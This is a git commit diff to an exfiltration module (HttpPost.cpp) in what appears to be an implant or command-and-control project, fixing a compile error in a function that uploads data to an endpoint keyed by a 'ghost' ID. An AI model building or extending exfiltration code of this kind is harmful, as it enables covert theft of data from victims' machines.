8200555d8714eb079507e6c8743e5a0a5f50925c
ENIX1701 <enix1701@gmail.com>
2026-03-15 11:01:07 +0100

    chore: adjust var name cause the project didn't compile...

--- src/modules/exfiltration/HttpPost.cpp
+++ src/modules/exfiltration/HttpPost.cpp
@@ -1,7 +1,8 @@
 #include "modules/exfiltration/HttpPost.hpp"
+#include "core/Config.hpp"
 #include "network/Comms.hpp"
 
 bool HttpPostMethod::send(const std::string& type, const std::string& data) {
-    std::string endpoint = "api/v1/ghost/upload/" + Config::GetGhostId() + "/" + filename;
+    std::string endpoint = "api/v1/ghost/upload/" + Config::GetGhostId() + "/" + type;
     return Comms::UploadFile(endpoint, type, data);
 }
